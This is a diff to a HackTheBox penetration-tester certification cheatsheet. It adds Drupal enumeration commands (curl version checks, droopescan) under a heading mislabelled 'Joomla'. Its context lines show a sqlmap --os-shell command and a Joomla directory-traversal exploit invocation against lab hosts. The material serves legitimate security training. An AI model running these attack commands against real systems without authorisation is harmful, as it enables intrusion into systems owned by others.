@@ -78,6 +78,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [Application Enumeration](#application-enumeration)
   	- [WordPress](#WordPress)
   	- [Joomla](#joomla)
+  	- [Drupal](#drupal)
   	- [Splunk](#splunk)
   	- [PRTG](#prtg)
   	- [GITLAB](#gitlab)
@@ -1969,6 +1970,15 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	--> https://github.com/dpgg101/CVE-2019-10945
 	--> python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
+```
+### Joomla
+```
+- curl -s http://drupal.inlanefreight.local | grep Drupal
+- curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+- curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
+- droopescan scan drupal -u http://drupal.inlanefreight.local
+- https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html
+- 
 ```
 ### Splunk
 ```
